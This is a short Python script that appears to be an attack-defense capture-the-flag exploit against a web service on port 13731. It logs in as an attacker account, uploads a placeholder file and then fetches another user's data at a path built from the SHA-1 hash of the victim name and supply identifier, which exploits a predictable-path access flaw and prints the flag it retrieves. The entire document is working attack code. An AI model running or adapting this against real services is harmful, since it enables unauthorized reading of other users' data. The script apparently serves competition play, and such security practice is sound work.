from requests import Session
import sys
from hashlib import sha1

ip = sys.argv[1]
# get them from flagid
victim = sys.argv[2]
supply = sys.argv[3]

url = 'http://' + ip +  ':13731'
fname = (victim + supply).encode()

# register a user
attacker = 'kk'
password = 'eeee'

s = Session()
s.post(url + '/login', data = {'user': attacker, 'pass': password})
s.post(url + '/staff/supply', files = {'supply': ('hallowas', 'not matter')})

hash1 = sha1()
hash1.update(fname)
digest = hash1.hexdigest()
r = s.get(url + '/staff/supply/' + digest)
flag = r.text
print(flag)
